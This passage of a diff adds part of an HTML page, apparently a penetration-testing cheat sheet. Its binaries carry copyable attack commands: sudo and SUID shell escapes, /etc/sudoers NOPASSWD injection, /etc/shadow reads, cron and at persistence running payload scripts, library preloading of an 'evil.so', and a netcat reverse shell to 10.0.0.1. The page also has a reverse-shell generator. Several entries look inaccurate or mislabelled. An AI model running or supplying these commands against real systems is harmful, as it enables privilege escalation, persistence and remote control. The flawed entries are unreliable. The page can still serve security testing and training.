+            {name: "ping", os: "linux", categories: ["suid", "capabilities"], desc: "Send ICMP echo requests", usage: "# Capabilities exploitation\n# If ping has cap_net_raw+ep capability\n./ping -c 1 -p 'payload' 10.0.0.1"},
+            {name: "ping6", os: "linux", categories: ["suid", "capabilities"], desc: "Send ICMPv6 echo requests", usage: "# Capabilities exploitation\n# If ping6 has cap_net_raw+ep capability\n./ping6 -c 1 -p 'payload' ::1"},
+
+            // Linux - Kernel Exploitation Helpers
+            {name: "mount", os: "linux", categories: ["suid", "sudo"], desc: "Mount filesystems", usage: "# SUID mount exploitation\n./mount -o bind /bin/bash /bin/mount\n/bin/mount -p\n\n# Sudo\nsudo mount -o bind /bin/bash /usr/bin/mount"},
+            {name: "umount", os: "linux", categories: ["suid", "sudo"], desc: "Unmount filesystems", usage: "# SUID exploitation\n./umount -l /proc\n\n# Sudo\nsudo umount -l /important/mount"},
+            {name: "fusermount", os: "linux", categories: ["suid"], desc: "Mount FUSE filesystems", usage: "# SUID exploitation\n./fusermount -u /mount/point"},
+
+            // Linux - Additional Sudo Abuses
+            {name: "dmesg", os: "linux", categories: ["sudo", "file-read"], desc: "Display kernel messages", usage: "# Read kernel logs\nsudo dmesg\n\n# Clear logs\nsudo dmesg -C"},
+            {name: "journalctl", os: "linux", categories: ["execution", "sudo", "file-read"], desc: "Query the systemd journal", usage: "# Shell escape via pager\nsudo journalctl\n!/bin/bash\n\n# Read all logs\nsudo journalctl --all"},
+            {name: "crontab", os: "linux", categories: ["persistence", "sudo"], desc: "Schedule recurring tasks.", usage: "# Add cron job\n(crontab -l; echo \"* * * * * /tmp/payload.sh\") | crontab -\n\n# Sudo edit\nsudo crontab -e"},
+            {name: "at", os: "linux", categories: ["persistence", "execution", "sudo"], desc: "Schedule one-time tasks.", usage: "# Schedule task\necho \"/tmp/payload.sh\" | at now + 1 minute\n\n# Sudo\necho \"/bin/bash\" | sudo at now"},
+            {name: "screen", os: "linux", categories: ["execution", "persistence", "sudo"], desc: "Terminal multiplexer", usage: "# Attach to root session\nscreen -x root/\n\n# Sudo\nsudo screen"},
+            {name: "tmux", os: "linux", categories: ["execution", "persistence", "sudo"], desc: "Terminal multiplexer", usage: "# Attach to session\ntmux attach -t root\n\n# Sudo\nsudo tmux"},
+            {name: "script", os: "linux", categories: ["execution", "sudo"], desc: "Record terminal session", usage: "# Spawn shell\nscript -q /dev/null\n\n# Sudo\nsudo script -q /dev/null"},
+            {name: "expect", os: "linux", categories: ["execution", "sudo"], desc: "Programmed dialogue with interactive programs", usage: "# Spawn shell\nexpect -c 'spawn /bin/bash; interact'\n\n# Sudo\nsudo expect -c 'spawn /bin/bash; interact'"},
+            {name: "tee", os: "linux", categories: ["file-write", "suid", "sudo"], desc: "Read from stdin and write to files", usage: "# File write\necho 'data' | ./tee /etc/passwd\n\n# Sudo append\necho 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers"},
+            {name: "nohup", os: "linux", categories: ["execution", "sudo"], desc: "Run command immune to hangups", usage: "# Execute command\nnohup /bin/bash\n\n# Sudo\nsudo nohup /bin/bash"},
+
+            // Linux - Development environments
+            {name: "pry", os: "linux", categories: ["execution", "sudo"], desc: "Ruby REPL", usage: "# Execute shell\npry\nsystem(\"/bin/bash\")\n\n# Sudo\nsudo pry\nsystem(\"/bin/bash\")"},
+            {name: "irb", os: "linux", categories: ["execution", "sudo"], desc: "Interactive Ruby", usage: "# Execute shell\nirb\nexec '/bin/bash'\n\n# Sudo\nsudo irb\nexec '/bin/bash'"},
+            {name: "jjs", os: "linux", categories: ["execution", "file-read", "file-write", "sudo"], desc: "Java JavaScript shell", usage: "# Execute command\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash').waitFor()\" | jjs\n\n# File read\necho 'print(readFully(\"/etc/shadow\"))' | jjs\n\n# Sudo\necho \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash').waitFor()\" | sudo jjs"},
+            {name: "jrunscript", os: "linux", categories: ["execution", "file-read", "file-write", "sudo"], desc: "Java scripting launcher", usage: "# Execute command\njrunscript -e \"exec('/bin/bash')\"\n\n# Sudo\nsudo jrunscript -e \"exec('/bin/bash')\""},
+
+            // Linux - LD_PRELOAD and Library Loading
+            {name: "ld.so", os: "linux", categories: ["library-load", "suid"], desc: "Dynamic linker/loader", usage: "# Library preload\n./ld.so --preload /tmp/evil.so /bin/id"},
+            {name: "ld-linux", os: "linux", categories: ["library-load", "suid"], desc: "Dynamic linker/loader", usage: "# Library preload\n./ld-linux --preload /tmp/evil.so /bin/id"},
+            {name: "logsave", os: "linux", categories: ["execution", "suid"], desc: "Save command output to log file", usage: "# Execute command\n./logsave /dev/null /bin/bash -i -p"},
+            {name: "run-parts", os: "linux", categories: ["execution", "sudo"], desc: "Run scripts in a directory", usage: "# Execute scripts\nsudo run-parts --regex '^bash$' /bin"},
+
+            // Additional Windows binaries
+            {name: "forfiles.exe", os: "windows", categories: ["execution"], desc: "Execute commands on files", usage: "# Execute command\nforfiles /p c:\\windows\\system32 /m cmd.exe /c \"@file /c calc.exe\""},
+            {name: "pcalua.exe", os: "windows", categories: ["execution", "bypass"], desc: "Program Compatibility Assistant", usage: "# Execute program\npcalua.exe -a C:\\path\\to\\payload.exe"},
+            {name: "bash.exe", os: "windows", categories: ["execution"], desc: "Windows Subsystem for Linux", usage: "# Execute Linux commands on Windows\nbash.exe -c \"nc -e /bin/bash 10.0.0.1 4444\""},
+            {name: "diskshadow.exe", os: "windows", categories: ["execution", "bypass"], desc: "Volume Shadow Copy Service", usage: "# Execute script\ndiskshadow.exe /s script.txt\n\n# Script content:\nexec c:\\path\\to\\payload.exe"},
+            {name: "dnx.exe", os: "windows", categories: ["execution"], desc: ".NET Execution Environment", usage: "# Execute .NET application\ndnx.exe consoleapp"},
+            {name: "rcsi.exe", os: "windows", categories: ["execution"], desc: "C# interactive compiler", usage: "# Execute C# code\nrcsi.exe\nSystem.Diagnostics.Process.Start(\"cmd.exe\");"},
+            {name: "tracker.exe", os: "windows", categories: ["execution", "bypass"], desc: "Indexing service", usage: "# DLL execution\ntracker.exe /d C:\\path\\to\\payload.dll /c extraction"},
+        ];
+
+        // Store binary data for copy operations
+        const binaryUsageData = {};
+        binaries.forEach((bin, index) => {
+            binaryUsageData[index] = bin.usage;
+        });
+
+        const grid = document.getElementById('grid');
+        const searchBox = document.querySelector('.search-box');
+        const totalSpan = document.getElementById('total');
+        const visibleSpan = document.getElementById('visible');
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        let activeFilter = 'all';
+
+        // Shell Generator
+        const shellTypeSelect = document.getElementById('shell-type');
+        const shellIpInput = document.getElementById('shell-ip');
+        const shellPortInput = document.getElementById('shell-port');
+        const generateShellBtn = document.getElementById('generate-shell-btn');
+        const shellOutputContainer = document.getElementById('shell-output-container');
+        const shellOutput = document.getElementById('shell-output');
+        const shellCopyBtn = document.getElementById('shell-copy-btn');
+
+        function initShellGenerator() {
+            // Sort shells by name for better organization
+            const sortedShells = Object.entries(reverseShells).sort((a, b) => a[1].name.localeCompare(b[1].name));
+            
+            sortedShells.forEach(([key, shell]) => {
+                const option = document.createElement('option');
+                option.value = key;
+                option.textContent = shell.name;
+                shellTypeSelect.appendChild(option);
+            });
+
+            generateShellBtn.addEventListener('click', () => {
+                const type = shellTypeSelect.value;
+                const ip = shellIpInput.value || '127.0.0.1';
+                const port = shellPortInput.value || '9001';
+
+                if (!type) return;
+
+                let command = reverseShells[type].template;
+                command = command.replace(/##LHOST##/g, ip).replace(/##LPORT##/g, port);
+                
+                shellOutput.textContent = command;
+                shellOutputContainer.classList.remove('hidden');
+            });
+
+            shellCopyBtn.addEventListener('click', () => {
+                copyToClipboard(shellOutput.textContent, shellCopyBtn);
+            });
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function copyToClipboard(text, button) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.textContent;
+                button.textContent = '✓ Copied!';
+                setTimeout(() => {
+                    button.textContent = originalText;
+                }, 2000);
+            }).catch(err => {
+                console.error('Failed to copy:', err);
+            });
+        }
+
+        function createCard(binary, index) {
+            const badges = [
+                `<span class="badge ${binary.os}">${binary.os.toUpperCase()}</span>`,
+                ...binary.categories.map(cat => {
+                    let className = 'category';
+                    if (cat === 'suid') className = 'suid';
+                    else if (cat === 'sudo') className = 'sudo';
+                    else if (cat === 'capabilities') className = 'capabilities';
+                    return `<span class="badge ${className}">${escapeHtml(cat)}</span>`;
+                })
+            ].join('');
+
+            const searchData = `${binary.name.toLowerCase()} ${binary.os} ${binary.categories.join(' ')} ${binary.desc.toLowerCase()} ${binary.usage.toLowerCase()}`;
+
+            return `<div class="card" data-search="${escapeHtml(searchData)}" data-os="${binary.os}" data-categories="${binary.categories.join(' ')}">
+                <h3>${escapeHtml(binary.name)}</h3>
+                <div class="badges">${badges}</div>
+                <div class="desc">${escapeHtml(binary.desc)}</div>
+                <div class="usage">
+                    <div class="usage-title">Usage Examples:</div>
+                    <button class="copy-btn" data-index="${index}">Copy</button>
+                    <pre>${escapeHtml(binary.usage)}</pre>
+                </div>
+            </div>`;
+        }
+
+        function init() {
+            grid.innerHTML = binaries.map((binary, index) => createCard(binary, index)).join('');
+            totalSpan.textContent = binaries.length;
+            visibleSpan.textContent = binaries.length;
+            initShellGenerator();
+
+            // Add event listeners to copy buttons
+            document.querySelectorAll('.usage .copy-btn').forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const index = parseInt(this.getAttribute('data-index'));
+                    copyToClipboard(binaryUsageData[index], this);
+                });
+            });
+        }
+
+        function applyFilters() {
+            const query = searchBox.value.toLowerCase().trim();
+            const cards = grid.querySelectorAll('.card');
+            let visible = 0;
+            
+            cards.forEach(card => {
+                const searchData = card.getAttribute('data-search');
+                const os = card.getAttribute('data-os');
+                const categories = card.getAttribute('data-categories');
+                
+                let matchesFilter = activeFilter === 'all' ||
+                                   (activeFilter === 'windows' && os === 'windows') ||
+                                   (activeFilter === 'linux' && os === 'linux') ||
+                                   categories.includes(activeFilter);
+                
+                let matchesSearch = !query || searchData.includes(query);
+                
+                if (matchesFilter && matchesSearch) {
+                    card.classList.remove('hidden');
+                    visible++;
+                    
+                    // Apply highlighting if there's a search query
+                    if (query) {
+                        const elements = [
+                            card.querySelector('h3'),
+                            card.querySelector('.desc'),
+                            card.querySelector('pre')
+                        ];
+                        
+                        elements.forEach(elem => {
+                            const text = elem.textContent;
+                            if (text.toLowerCase().includes(query)) {
+                                // Create a regex that matches the query
+                                const regex = new RegExp(`(${query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')})`, 'gi');
+                                const highlighted = text.replace(regex, '<span class="highlight">$1</span>');
+                                elem.innerHTML = highlighted.split('<').join('&lt;').split('>').join('&gt;')
+                                    .replace(/&lt;span class="highlight"&gt;/g, '<span class="highlight">')
+                                    .replace(/&lt;\/span&gt;/g, '</span>');
+                            }
+                        });
+                    }
+                } else {
+                    card.classList.add('hidden');
+                }
+            });
+            
+            visibleSpan.textContent = visible;
+        }
+
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                filterBtns.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                activeFilter = btn.getAttribute('data-filter');
+                applyFilters();
+            });
+        });
+
+        searchBox.addEventListener('input', applyFilters);
+        init();
+    </script>
+</body>
+</html>
